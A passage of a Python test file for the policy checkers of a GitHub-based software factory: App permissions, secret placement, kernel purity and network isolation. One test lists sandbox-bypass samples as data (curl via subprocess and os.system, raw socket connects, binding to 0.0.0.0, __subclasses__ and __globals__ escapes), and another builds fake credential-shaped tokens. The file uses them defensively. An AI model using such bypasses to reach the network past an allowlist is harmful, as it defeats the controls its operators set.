        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s has a link header, so it is one page of more"
                                         % call))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s lists 2 of the 3 it counts" % call))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: %s lists combsmith/software-factory more than once"
                                         % call))
        self.assertTrue(caught(problems, "trials/P-39.grants.json: its read GET /orgs/combsmith/installations lists "
                                         "18 of the 19 it counts"))
        for app in ("controller", "pr-review", "reader"):
            self.assertTrue(caught(problems, "%s: no fixture of trial P-39 records GET /installation/repositories"
                                             % app))

    def test_with_no_record_of_what_github_granted_the_data_is_not_trusted(self):
        facts = (ROOT / "schemas" / "facts.schema.json").read_text()
        problems = check_apps.run(tree({"config/apps.json": json.dumps(self.table), "schemas/facts.schema.json": facts}))
        self.assertTrue(caught(problems, "no fixture of trial P-39 in trials/ records GET /orgs/combsmith/installations"))
        self.fixture["exchanges"] = [e for e in self.fixture["exchanges"]
                                     if e["request"]["call"] != check_apps.INSTALLATIONS]
        self.assertTrue(caught(self.check(), "no fixture of trial P-39"))

    def test_each_apps_key_is_kept_in_the_environment_of_the_job_that_holds_it(self):
        # A job that names an environment reads every secret in it. With the Controller's and the reader's keys
        # swapped, run, which reads untrusted text, would hold the Controller's key, which writes check runs.
        apps = self.apps
        apps["controller"]["key"], apps["reader"]["key"] = apps["reader"]["key"], apps["controller"]["key"]
        self.apps["pr-review"]["key"]["secret"] = "REVIEW_APP_KEY"
        problems = self.check()
        self.assertTrue(caught(problems, "controller: its key is kept in factory-run, and the poller job holds it"))
        self.assertTrue(caught(problems, "reader: its key is kept in factory-poller, and the run job holds it"))
        self.assertTrue(caught(problems, "controller: its key is kept as READER_APP_KEY; name it CONTROLLER_APP_KEY"))
        self.assertTrue(caught(problems, "reader: its key is kept as CONTROLLER_APP_KEY; name it READER_APP_KEY"))
        self.assertTrue(caught(problems, "pr-review: its key is kept as REVIEW_APP_KEY; name it PR_REVIEW_APP_KEY"))
        self.assertFalse(caught(problems, "pr-review: its key is kept in"))
        self.setUp()
        del self.apps["pr-review"]["key"]
        self.assertTrue(caught(self.check(), "pr-review: names no environment its key is kept in"))

    def test_every_roles_key_is_kept_in_applys_environment_and_they_may_share_it(self):
        # apply holds each Role's App key (design §4.9), so a second Role's App shares its environment.
        self.apps["author"] = {"key": {"environment": "factory-apply", "secret": "AUTHOR_APP_KEY"}}
        self.assertEqual(check_apps._keys(self.apps), [])
        self.apps["author"]["key"]["environment"] = "factory-run"
        self.assertTrue(caught(check_apps._keys(self.apps), "author: its key is kept in factory-run, and the apply job"))

    def test_no_app_may_change_a_workflow_or_upload_to_code_scanning(self):
        # GitHub refuses an App's push under .github/workflows/ without `workflows`, and with `security_events: write`
        # an App could upload to code scanning under CodeQL's tool and category. No Factory App holds either, at any
        # level, whatever need it names.
        self.assertEqual(self.check(), [])
        for name in ("workflows", "security_events"):
            for level in ("read", "write"):
                self.setUp()
                self.apps["controller"]["permissions"][name] = {"level": level, "needs": ["read:facts.checks"]}
                said = "controller: holds %s; no Factory App may" % name
                self.assertTrue(caught(self.check(), said), (name, level))

    def test_a_permission_nothing_needs_is_caught(self):
        self.apps["controller"]["permissions"]["checks"]["needs"] = []
        del self.apps["reader"]["permissions"]["issues"]["needs"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: checks names no Effect, write or read that needs it"))
        self.assertTrue(caught(problems, "reader: issues names no Effect, write or read that needs it"))

    def test_the_reader_given_any_write_is_caught(self):
        self.apps["reader"]["permissions"]["contents"]["level"] = "write"
        self.apps["reader"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "reader: contents is write; the reader App writes nothing"))
        self.assertTrue(caught(problems, "reader: pull_requests serves effect:comment; the reader App writes nothing"))

    def test_a_write_that_only_a_read_needs_is_caught(self):
        self.apps["pr-review"]["permissions"]["contents"]["level"] = "write"
        self.assertTrue(caught(self.check(), "pr-review: contents is write and only a read needs it"))

    def test_a_need_served_by_another_permission_or_level_is_caught(self):
        self.apps["controller"]["permissions"]["contents"]["needs"].append("read:facts.reviews")
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("effect:comment")
        problems = self.check()
        self.assertTrue(caught(problems, "controller: contents serves read:facts.reviews, which the table maps to "
                                         "pull_requests"))
        self.assertTrue(caught(problems, "controller: pull_requests is read and serves effect:comment, which the "
                                         "table maps to pull_requests write"))

    def test_a_grant_for_a_need_that_is_waiting_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"]["needs"].append("effect:dequeue_merge")
        self.assertTrue(caught(self.check(), "controller: pull_requests serves effect:dequeue_merge, which waits on the "
                                             "queue App, combsmith-sf-queue"))

    def test_a_write_need_held_by_two_apps_is_caught(self):
        self.apps["controller"]["permissions"]["pull_requests"] = {"level": "write", "needs": ["effect:comment"]}
        self.assertTrue(caught(self.check(), "effect:comment is held by controller and pr-review"))

    def test_a_need_with_no_mapping_and_no_wait_is_caught(self):
        self.needs["read:facts.reviews"] = {}
        self.needs["read:facts.threads"] = {"permission": "pull_requests", "level": "read", "waits_on": "trial P-2"}
        del self.needs["read:facts.item"]
        problems = self.check()
        self.assertTrue(caught(problems, "read:facts.reviews maps to no permission and waits on nothing"))
        self.assertTrue(caught(problems, "read:facts.threads both maps to a permission and waits"))
        self.assertTrue(caught(problems, "controller: metadata serves read:facts.item, which is not in the table of needs"))

    def test_a_read_of_a_fact_that_does_not_exist_is_caught(self):
        self.needs["read:facts.title"] = {"permission": "pull_requests", "level": "read"}
        self.assertTrue(caught(self.check(), "read:facts.title reads a field facts/1 does not have"))
        # A property of one of facts/1's definitions is named as definition.property, and only one it has.
        for code in ("read:facts.actor.title", "read:facts.nothing.can_write", "read:facts.can_write"):
            self.setUp()
            self.needs[code] = {"permission": "metadata", "level": "read"}
            self.assertTrue(caught(self.check(), "%s reads a field facts/1 does not have" % code), code)
        self.setUp()
        self.assertIn("read:facts.actor.can_write", self.needs)
        self.assertEqual(self.check(), [])

    def test_an_app_installed_across_the_org_is_caught(self):
        self.apps["controller"]["installed_on"] = "all"
        self.apps["reader"]["installed_on"] = ["combsmith"]
        problems = self.check()
        self.assertTrue(caught(problems, "controller: installed_on is not a list of named repos"))
        self.assertTrue(caught(problems, "reader: installed_on is not a list of named repos"))

    def test_a_repo_named_twice_is_caught(self):
        self.apps["reader"]["installed_on"].append(self.apps["reader"]["installed_on"][0])
        self.assertTrue(caught(self.check(), "reader: combsmith/software-factory is named twice in installed_on"))

    def test_an_app_named_for_another_key_is_caught(self):
        self.apps["controller"]["name"] = "combsmith-sf-reader"
        self.assertTrue(caught(self.check(), "controller: the App is named combsmith-sf-reader; name it "
                                             "combsmith-sf-controller"))

    def test_a_file_that_is_missing_or_cannot_be_read_is_a_problem_not_a_crash(self):
        self.assertTrue(caught(check_apps.run(tree({"x": ""})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{"})), "config/apps.json cannot be read"))
        self.assertTrue(caught(check_apps.run(tree({"config/apps.json": "{}"})), "names no Apps"))
        # A schema whose properties, $defs or a definition's properties are not objects is unreadable, never a crash
        # (Codex on PR 298).
        table = (ROOT / "config" / "apps.json").read_text()
        for schema in ({"properties": None}, {"properties": {}, "$defs": []}, {"properties": {}, "$defs": {"actor": {"properties": 1}}}, []):
            got = check_apps.run(tree({"config/apps.json": table, "schemas/facts.schema.json": json.dumps(schema)}))
            self.assertTrue(caught(got, "schemas/facts.schema.json cannot be read"), schema)


class Purity(unittest.TestCase):
    def test_io_in_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "import os\n\ndef f():\n    return open('x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "imports os") and caught(problems, "uses open"))

    def test_io_in_a_package_below_the_kernel_is_caught(self):
        root = tree({"kernel/a.py": "from kernel.extra import clock\n", "kernel/extra/clock.py": "import time\n"})
        self.assertTrue(caught(check_purity.run(root), "extra/clock.py:1 imports time"))

    def test_a_limit_written_into_the_kernel_is_caught(self):
        root = tree({"kernel/x.py": "def f(runs):\n    return len(runs) >= 3 or runs[0] == 1\n"})
        self.assertEqual(len(check_purity.run(root)), 1)

    def test_only_the_calendar_may_write_a_number(self):
        # The calendar is nobody's choice, so it is the one place the Kernel writes a number but 0 and 1: in terms.py,
        # under its own name, with its own value. Any other number is a limit, and a limit is data.
        calendar = "MINUTES_PER_HOUR = 60\nLEAP_YEARS = (4, 100, 400)\nFEBRUARY = 2\n"
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": calendar})), [])
        for rel, text in (("kernel/terms.py", "MINUTES_PER_HOUR = 61\n"), ("kernel/terms.py", "LEAP_YEARS = (4, 100, 401)\n"),
                          ("kernel/terms.py", "MINUTES_PER_HOUR = 60.0\n"), ("kernel/terms.py", "MAX_ATTEMPTS = 3\n"),
                          ("kernel/terms.py", "FEBRUARY = HOURS_PER_DAY = 2\n"), ("kernel/x.py", "MINUTES_PER_HOUR = 60\n"),
                          ("kernel/terms.py", "def f():\n    MINUTES_PER_HOUR = 60\n    return MINUTES_PER_HOUR\n")):
            self.assertTrue(caught(check_purity.run(tree({rel: text})), "writes the number"), (rel, text))
        # A unit is assigned once, so no second assignment can change it: not to 0, 1 or True, which are no number
        # the check refuses, and not from outside terms.py. What cannot be read as a value is a problem, not a crash.
        again = "SECONDS_PER_MINUTE = 60\nHOURS_PER_DAY = 24\n"
        for rel, text in (("kernel/terms.py", again + "SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = True\n"),
                          ("kernel/terms.py", again + "HOURS_PER_DAY = 24\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE: int = 60\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE = {[]: 1}\n"),
                          ("kernel/terms.py", "SECONDS_PER_MINUTE, X = 60, 1\n"),
                          ("kernel/x.py", "from kernel import terms as t\n\ndef f():\n    t.SECONDS_PER_MINUTE = 1\n"),
                          ("kernel/x.py", "def f(n):\n    HOURS_PER_DAY = n\n    return HOURS_PER_DAY\n")):
            self.assertTrue(caught(check_purity.run(tree({"kernel/terms.py": again, rel: text})), "a unit of the calendar"),
                            (rel, text))
        self.assertEqual(check_purity.run(tree({"kernel/terms.py": again, "kernel/x.py": "def f(t):\n"
                                                "    return t.SECONDS_PER_MINUTE\n"})), [])

    def test_state_kept_between_calls_is_caught(self):
        root = tree({"kernel/x.py": "SEEN = {}\nKIND = 'held'\nNAMES = frozenset({'a'})\n"})
        self.assertEqual(check_purity.run(root), ["x.py:1 holds a value that can change; State is never stored"])
        hidden = {"a default": "def f(key, seen={}):\n    return seen\n",
                  "a class": "class Memo:\n    seen = {}\n",
                  "code at import": "if True:\n    SEEN = {}\n",
                  "a global": "def f():\n    global X\n    X = 1\n"}
        for name, text in hidden.items():
            self.assertTrue(check_purity.run(tree({"kernel/x.py": text})), name)

    def test_an_attribute_assigned_is_caught(self):
        # A module that assigns another's names changes what that module decides from outside it: the gate's
        # severities from derive.py, or a code from terms.py, at import or in a call.
        for text in ("from kernel import gate as _gate\n\n_gate.SECURITY = 'none'\n",
                     "from kernel import terms as t\nt.HELD = 'x'\n",
                     "from kernel import gate\n\n\ndef f():\n    gate.GATING_SEVERITIES = frozenset()\n",
                     "from kernel import terms as t\n\n\ndef f():\n    del t.HELD\n",
                     "from kernel import terms as t\n\n\ndef f():\n    t.HELD, x = 'a', 1\n    return x\n",
                     "def f():\n    f.seen = 1\n"):
            self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": text})), "assigns an attribute"), text)
        self.assertEqual(check_purity.run(tree({"kernel/x.py": "from kernel import terms as t\n\n\ndef f():\n"
                                                "    return t.HELD\n"})), [])

    def test_the_brakes_and_the_gate_stand_apart(self):
        # Each is a protected path alone. The gate imports nothing of the Kernel and the brakes only its codes, so no
        # module that is not protected can change what they decide, and no other module stands in for one of theirs.
        gate = "SECURITY = 'security'\n\n\ndef gates(facts, config):\n    return []\n"
        brakes = "from kernel import terms as t\nfrom kernel.terms import HELD\n\n\ndef paused(_decision, facts):\n" \
                 "    return None\n"
        derive = "from kernel import brakes, gate\nfrom kernel.gate import gates\nimport kernel.gate as gate\n\n\n" \
                 "def derive(facts):\n    pause = brakes.paused(None, facts)\n    return pause or gates(facts, {})\n"
        clean = {"kernel/gate.py": gate, "kernel/brakes.py": brakes, "kernel/derive.py": derive}
        self.assertEqual(check_purity.run(tree(clean)), [])
        # Any binding of a name either owns stands in for theirs, at any depth and in any form, and so does a binding
        # of either module's own name to anything but that module. Each also binds no name of the other's.
        d, g, b = "kernel/derive.py", "kernel/gate.py", "kernel/brakes.py"
        for rel, text, word, owner in (
                (d, "def gates(facts, config):\n    return []\n", "gates", "gate.py"),
                (d, "def f(facts):\n    def gates(a, b):\n        return []\n    return gates(facts, 0)\n", "gates",
                 "gate.py"),
                (d, "SECURITY = 'none'\n", "SECURITY", "gate.py"),
                (d, "def f(facts):\n    gates = facts\n    return gates\n", "gates", "gate.py"),
                (d, "def derive(facts, gates=None):\n    return gates\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return (lambda gates: gates)(xs)\n", "gates", "gate.py"),
                (d, "def f(xs):\n    return [gates for gates in xs]\n", "gates", "gate.py"),
                (d, "def f(xs):\n    for paused in xs:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    with x as paused:\n        return paused\n", "paused", "brakes.py"),
                (d, "def f(x):\n    try:\n        return x\n    except ValueError as gates:\n        return gates\n",
                 "gates", "gate.py"),
                (d, "def f(x):\n    if (gates := x):\n        return gates\n", "gates", "gate.py"),
                (d, "from kernel.terms import NONE as gates\n", "gates", "gate.py"),
                (d, "from kernel.gate import SECURITY as gates\n", "gates", "gate.py"),
                (d, "from kernel.brakes import paused as on_act\nfrom kernel.terms import HELD as paused\n", "paused",
                 "brakes.py"),
                (d, "from kernel import terms as gate\n", "gate", "gate.py"),
                (d, "import kernel.terms as gate\n", "gate", "gate.py"),
                (d, "from kernel import derive as brakes\n", "brakes", "brakes.py"),
                (d, "def brakes(x):\n    return x\n", "brakes", "brakes.py"),
                (b, "from kernel.terms import HELD as gates\n" + brakes, "gates", "gate.py"),
                (b, "from kernel.terms import HELD as paused\n" + brakes, "paused", "brakes.py"),
                (g, gate + "\n\ndef paused(x):\n    return x\n", "paused", "brakes.py"),
                (g, gate + "\n\ndef f(brakes):\n    return brakes\n", "brakes", "brakes.py")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, "binds %s, which %s owns" % (word, owner)), (rel, text, said))
        for rel, text, words in (("kernel/gate.py", "from kernel import terms as t\n" + gate, "imports kernel.terms"),
                                 ("kernel/gate.py", "import kernel.derive\n" + gate, "imports kernel.derive"),
                                 ("kernel/gate.py", "from . import terms\n" + gate, "imports ."),
                                 ("kernel/brakes.py", "from kernel.derive import since_writer\n" + brakes,
                                  "imports kernel.derive"),
                                 ("kernel/brakes.py", "from kernel import terms, decide\n" + brakes,
                                  "imports kernel.decide")):
            said = check_purity.run(tree(dict(clean, **{rel: text})))
            self.assertTrue(caught(said, words), (rel, text, said))

    def test_a_way_round_the_names_is_caught(self):
        root = tree({"kernel/x.py": "def f():\n    return __builtins__['open'], getattr(f, 'x')\n"})
        problems = check_purity.run(root)
        self.assertTrue(caught(problems, "uses __builtins__") and caught(problems, "uses getattr"))

    def test_no_kernel_and_a_kernel_that_cannot_be_read_are_problems_not_crashes(self):
        self.assertEqual(check_purity.run(tree({"x": ""})), ["there is no kernel/ to check"])
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "def f(:\n"})), "cannot be read as Python"))
        self.assertTrue(caught(check_purity.run(tree({"kernel/x.py": "async def f():\n    return 1\n"})), "async function"))


class Repo(unittest.TestCase):
    def test_third_party_code_is_caught(self):
        root = tree({"a.py": "import requests\n", "requirements.txt": "requests\n",
                     "tools/vendor/requests/__init__.py": "", "dev-requirements.txt": "x\n", "poetry.lock": ""})
        problems = check_repo.run(root)
        for words in ("imports requests", "requirements.txt: a dependency manifest", "dev-requirements.txt: a dep",
                      "poetry.lock: a dep", "copied in is still third-party"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(check_repo.run(tree({"docs/prd/requirements.md": "x", "a.py": "from . import b\n"})),
                                "manifest"))

    def test_only_the_transport_reaches_the_network(self):
        # Issue 191, ruling 3: only adapters/github.py imports what reaches the network; elsewhere each way of naming
        # it is refused, and urllib's parsing, which reaches nothing, is not.
        refused = ("import urllib.request\n", "from urllib import request\n", "import http.client\n",
                   "from http import client\n", "import socket\n", "import ssl\n", "from xmlrpc.client import X\n")
        for text in refused:
            self.assertTrue(caught(check_repo.run(tree({"tools/a.py": text})), "reaches the network"), text)
            self.assertFalse(caught(check_repo.run(tree({"adapters/github.py": text})), "reaches the network"), text)
        self.assertTrue(caught(check_repo.run(tree({"adapters/pull.py": "import urllib.request\n"})), "reaches the network"))
        self.assertFalse(caught(check_repo.run(tree({"tools/a.py": "import urllib.parse\nfrom urllib import parse\n"})),
                                "reaches the network"))

    def test_the_p50_stub_alone_may_serve_and_only_on_loopback(self):
        # Decision 0044's one exception (issue 287), held by an allowlist: tools/trial_p50_stub.py may import
        # http.server, json, os and sys by their own names, name nothing of http, os and sys but what it uses, make its
        # server one way, on 127.0.0.1 written as it is, and touch no socket; and no workflow here names it.
        stub = (ROOT / "tools" / "trial_p50_stub.py").read_text()
        rel = "tools/trial_p50_stub.py"
        self.assertEqual(check_repo.run(clone({})), [], "the stub as it is")
        self.assertTrue(caught(check_repo.run(tree({"tools/trial_p51_stub.py": "import http.server\n"})), "reaches the network"))
        served = 'http.server.HTTPServer(("127.0.0.1", 0), Stub)'
        self.assertIn(served, stub)
        other = "makes its server other than as HTTPServer"
        bypasses = [
            # Reaching out.
            ("a client module", "import urllib.request\n", "imports urllib.request, which the stub may not"),
            ("http.client beside the server", "import http.server\nhttp.client.HTTPSConnection('x')\n", "names http.client.HTTPSConnection"),
            ("a socket", "import socket\n", "imports socket, which the stub may not"),
            ("TLS", "import ssl\n", "imports ssl, which the stub may not"),
            ("a from-import", "from http import server\n", "imports from http"),
            ("an alias", "import http.server as h\n", "imports http.server, which the stub may not"),
            ("the server's own socket module", "import http.server\nhttp.server.socket.socket().connect(('x', 1))\n", "touches socket"),
            ("create_server through the server's module", "import http.server\nhttp.server.socket.create_server(('x', 1))\n", "touches create_server"),
            ("a module named by a string", "import importlib\nimportlib.import_module('so' + 'cket')\n", "imports importlib, which the stub may not"),
            ("a subprocess", "import subprocess\nsubprocess.run(['curl', 'x'])\n", "imports subprocess, which the stub may not"),
            ("the shell", "import os\nos.system('curl x')\n", "names os.system"),
            ("a module held itself", "import os\nx = os\n", "names os itself"),
            ("getattr", "import http.server\ngetattr(http.server, 'HTTPServer')(('0.0.0.0', 0), None)\n", "uses getattr"),
            ("the classes beneath every object", "().__class__.__base__.__subclasses__()\n", "uses __subclasses__"),
            ("a function's globals", "Stub.do_GET.__globals__\n", "uses __globals__"),
            ("a create_connection on anything", "x.create_connection(('a', 1))\n", "touches create_connection"),
            # Binding wider.
            ("any address", stub.replace(served, served.replace('"127.0.0.1"', '"0.0.0.0"')), other),
            ("every address", stub.replace(served, served.replace('"127.0.0.1"', '""')), other),
            ("a name for an address", stub.replace(served, served.replace('"127.0.0.1"', "HOST")), other),
            ("IPv6's every address", stub.replace(served, served.replace('"127.0.0.1"', '"::"')), other),
            ("an address by keyword", stub.replace(served, 'http.server.HTTPServer(server_address=("0.0.0.0", 0), RequestHandlerClass=Stub)'), other),
            ("the server under another name", stub.replace(served, 'S = http.server.HTTPServer\n    server = S(("0.0.0.0", 0), Stub)'), other),
            ("a subclass", "import http.server\nclass S(http.server.HTTPServer):\n    pass\nS(('0.0.0.0', 0), None)\n", other),
            ("socketserver beneath it", "import http.server\nhttp.server.socketserver.TCPServer(('0.0.0.0', 0), None)\n", "touches socketserver"),
            ("the module's own server", "import http.server\nhttp.server.test(bind='0.0.0.0')\n", "names http.server.test"),
            ("a bind put off", "server.server_address = ('0.0.0.0', 0)\nserver.server_bind()\n", "touches server_address"),
            ("a bind", "x.bind(('', 80))\n", "touches bind"),
        ]
        for name, text, said in bypasses:
            self.assertTrue(caught(check_repo.run(tree({rel: text})), said), name)
        workflow = (ROOT / ".github" / "workflows" / "verify.yml").read_text()
        named = workflow.replace("      - run: make verify\n", "      - run: python3 tools/trial_p50_stub.py p l\n")
        self.assertNotEqual(named, workflow)
        self.assertTrue(caught(check_repo.run(clone({".github/workflows/verify.yml": named})), "runs only in the canary's workflow"))

    def test_only_the_transport_names_githubs_artifact_storage(self):
        # The Maintainer's ruling on #192: the transport alone follows the artifact's redirect, so no other code names
        # the storage it goes to, by either of GitHub's hosts; a test may, to answer for it.
        for text in ('U = "https://productionresultssa0.blob.core.windows.net/x"\n',
                     'U = "pipelines.actions.githubusercontent.com"\n', 'U = "X.BLOB.CORE.WINDOWS.NET"\n'):
            for rel in ("adapters/artifacts.py", "tools/a.py", "sim/a.py"):
                self.assertTrue(caught(check_repo.run(tree({rel: text})), "artifact storage"), (rel, text))
            for rel in ("adapters/github.py", "tests/test_a.py"):
                self.assertFalse(caught(check_repo.run(tree({rel: text})), "artifact storage"), (rel, text))
        self.assertFalse(caught(check_repo.run(tree({"adapters/a.py": 'U = "api.github.com"\n'})), "artifact storage"))

    def test_code_loaded_round_the_import_list_is_caught(self):
        root = tree({"a.py": "s = __import__('socket')\nexec('import requests')\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "uses __import__") and caught(problems, "uses exec"))

    def test_something_shaped_like_a_credential_is_caught(self):
        for name in ("notes.md", "deploy.sh", "x.env", "key.pem"):
            root = tree({name: "token: " + "ghp_" + "a1B2" * 9 + "\n"})
            self.assertTrue(caught(check_repo.run(root), "shaped like a credential"), name)
        shapes = ["github_pat_" + "a1B2" * 9, "glpat-" + "a1B2" * 6, "sk-" + "ant-" + "a1B2" * 6, "AKIA" + "A1B2" * 4,
                  "xoxb" + "-1234567890-abc", "-----BEGIN RSA " + "PRIVATE KEY-----"]
        for shape in shapes:
            self.assertTrue(caught(check_repo.run(tree({"a.py": "X = '%s'\n" % shape})), "credential"), shape[:6])

    def test_a_model_named_by_its_full_id_is_caught_outside_the_documents(self):
        name = "claude-" + "opus-5-5"
        self.assertTrue(caught(check_repo.run(tree({"roles/pr-review/prompt.md": name})), "names a model"))
        self.assertTrue(caught(check_repo.run(tree({"config/x.json": '"gpt-' + '4o-mini"'})), "names a model"))
        self.assertFalse(caught(check_repo.run(tree({"docs/notes.md": name})), "names a model"))

    def test_an_edited_secrets_baseline_is_caught(self):
        whole = (ROOT / ".gitignore").read_text()
        self.assertFalse(caught(check_repo.run(tree({".gitignore": whole})), "baseline"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": whole.replace(".env\n", "", 1)})), "has been edited"))
        self.assertTrue(caught(check_repo.run(tree({".gitignore": "__pycache__/\n"})), "does not open with"))

    def test_code_owners_are_the_orgs_word_for_word(self):
        whole = (ROOT / ".github" / "CODEOWNERS").read_text()
        self.assertFalse(caught(check_repo.run(tree({".github/CODEOWNERS": whole})), "CODEOWNERS"))
        mine = whole + "/kernel/ @don-petry\n"
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": mine})), "not the org's file"))
        self.assertTrue(caught(check_repo.run(tree({"x": ""})), "CODEOWNERS is missing"))
        self.assertTrue(caught(check_repo.run(tree({".github/CODEOWNERS": whole, "CODEOWNERS": whole})),
                               "keep only .github/CODEOWNERS"))

    def test_a_second_definition_is_caught(self):
        root = tree({"a.py": "class T:\n    def test_x(self):\n        pass\n\n    def test_x(self):\n        pass\n",
                     "b.py": "async def f():\n    pass\n\nasync def f():\n    pass\n"})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "a.py:5 defines test_x a second time") and caught(problems, "b.py:4 defines f"))
        prop = "class T:\n    @property\n    def x(self):\n        return 1\n\n    @x.setter\n    def x(self, v):\n        pass\n"
        self.assertFalse(caught(check_repo.run(tree({"a.py": prop})), "a second time"))

    def test_syntax_newer_than_the_oldest_python_is_caught(self):
        root = tree({"a.py": "match 1:\n    case 1:\n        pass\n"})
        self.assertTrue(caught(check_repo.run(root), "is not Python 3.9"))

    def test_a_draw_that_differs_between_python_versions_is_caught(self):
        root = tree({"sim/x.py": "import random\n\ndef f(self):\n    return self.rng.choice([1, 2]), self.rng.random()\n",
                     "sim/y.py": "from random import shuffle\n"})
        problems = check_repo.run(root)
        self.assertEqual(len([p for p in problems if "sim/x.py" in p]), 1)
        self.assertTrue(caught(problems, "calls choice") and caught(problems, "takes a draw from random by name"))

    def test_reaching_into_the_proof_of_concept_is_caught(self):
        root = tree({"a.json": json.dumps({"repo": "combsmith/" + check_repo.FOREIGN})})
        self.assertTrue(caught(check_repo.run(root), "proof-of-concept repo"))

    def test_a_test_where_nothing_will_run_it_is_caught(self):
        root = tree({"tools/test_checks.py": "", "tests/unit/test_new.py": "", "tests/test_ok.py": ""})
        problems = check_repo.run(root)
        self.assertTrue(caught(problems, "tools/test_checks.py: a test outside tests/"))
        self.assertTrue(caught(problems, "tests/unit/test_new.py: a test below tests/"))
        self.assertFalse(caught(problems, "test_ok.py"))

    def test_a_link_is_refused_wherever_it_is(self):
        # Every check reads the tree through tools/walk.py, which never follows a link. Python
        # imports through one all the same, so a link would carry code past the purity check.
        root = tree({"kernel/x.py": "", "sim/x.py": "", "docs/ext/clock.py": "import time\n",
                     "docs/clock.py": "import time\n"})
        for where in ("kernel", "sim"):
            (root / where / "ext").symlink_to("../docs/ext", target_is_directory=True)
            (root / where / "clock.py").symlink_to("../docs/clock.py")
        (root / "kernel" / "gone.py").symlink_to("nowhere.py")
        self.assertFalse(caught(check_purity.run(root), "ext/clock.py"))      # why: unread, yet importable
        said = sorted(p for p in check_repo.run(root) if ": a link" in p)
        self.assertEqual([p.split(";")[0] for p in said],
                         ["kernel/clock.py: a link to a file", "kernel/ext: a link to a directory",
                          "kernel/gone.py: a link to nothing",
                          "sim/clock.py: a link to a file", "sim/ext: a link to a directory"])
        self.assertTrue(caught(said, "kernel/ext: a link to a directory; Python imports through it, but no check"))
        self.assertTrue(caught(said, "kernel/gone.py: a link to nothing; commit what it points at, or remove it"))


    def test_compiled_code_is_refused_wherever_it_is(self):
        # Python imports kernel/ghost.pyc with no source beside it, and kernel/decide.<tag>.so ahead of
        # kernel/decide.py, yet check_purity reads only .py. No check can read compiled code.
        root = tree({"kernel/decide.py": "", "kernel/ghost.pyc": "", "kernel/decide.cpython-39-darwin.so": "",
                     "sim/x.pyo": "", "tools/x.pyd": "", "docs/x.pyc.md": "", "docs/so": "",
                     "kernel/Spectre.PYC": "", "tools/y.So": ""})
        problems = check_repo.run(root)
        self.assertEqual(sorted(p.split(";")[0] for p in problems if "compiled" in p),
                         ["kernel/Spectre.PYC: compiled code", "kernel/decide.cpython-39-darwin.so: compiled code",
                          "kernel/ghost.pyc: compiled code", "sim/x.pyo: compiled code", "tools/x.pyd: compiled code",
                          "tools/y.So: compiled code"])
        self.assertTrue(caught(problems, "kernel/ghost.pyc: compiled code; Python loads it ahead of, or instead of, "
                                         "the reviewed source, and no check reads it"))

    def test_committed_local_output_is_refused(self):
        # An unchecked-hash kernel/__pycache__/hidden.cpython-39.pyc replaces the reviewed kernel/hidden.py
        # at import, and `git add -f` commits it past .gitignore. What git holds is not local output.
        token = "github_pat_" + "x" * 40 + "\n"
        root = tree({"kernel/hidden.py": "", "kernel/__pycache__/hidden.cpython-39.pyc": "", "corpus/d.jsonl": token,
                     "sim/__pycache__/x.cpython-39.pyc": "", "corpus/local.jsonl": ""})
        commit(root, {"kernel/hidden.py": FILE, "kernel/__pycache__/hidden.cpython-39.pyc": FILE, "corpus/d.jsonl": FILE})
        problems = check_repo.run(root)
        for words in ("kernel/__pycache__/hidden.cpython-39.pyc: compiled code",
                      "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local output, committed",
                      "corpus/d.jsonl: in corpus/, local output make_corpus.py writes, committed",
                      "corpus/d.jsonl: holds something shaped like a credential"):
            self.assertTrue(caught(problems, words), words)
        self.assertFalse(caught(problems, "sim/__pycache__"))
        self.assertTrue(caught(problems, "kernel/__pycache__/hidden.cpython-39.pyc: in __pycache__/, Python's local "
                                         "output, committed; Python loads it ahead of the reviewed source"))
        # A file system that folds case, as macOS's does, finds kernel/__PYCACHE__/ when Python opens
        # kernel/__pycache__/, and runs what is there.
        root = staged({"kernel/hidden.py": "", "kernel/__PYCACHE__/hidden.cpython-314.PYC": "", "Corpus/d.jsonl": ""})
        problems = check_repo.run(root)
        for words in ("kernel/__PYCACHE__/hidden.cpython-314.PYC: compiled code",
                      "kernel/__PYCACHE__/hidden.cpython-314.PYC: in __pycache__/", "Corpus/d.jsonl: in corpus/"):
            self.assertTrue(caught(problems, words), words)
        # What git holds is committed, whatever case the folder it is in was given on disk.
        root = commit(tree({"kernel/__pycache__/x.pyc": ""}), {"kernel/__PYCACHE__/x.pyc": FILE})
        self.assertTrue(caught(check_repo.run(root), "kernel/__pycache__/x.pyc: in __pycache__/"))

    def test_what_git_holds_is_refused_though_gone_from_disk(self):
        # Staged, then deleted from the working tree with the deletion not staged: the walk cannot see
        # it, yet the index still holds it, and the next commit takes it in.
        gone = ["kernel/ghost.pyc", "kernel/__pycache__/y.cpython-39.pyc", "corpus/d.jsonl", "docs/.gitmodules"]
        root = staged(dict({"kernel/x.py": "", "sim/z.PYC": ""}, **{rel: "" for rel in gone}))
        for rel in gone:
            (root / rel).unlink()
        problems = check_repo.run(root)
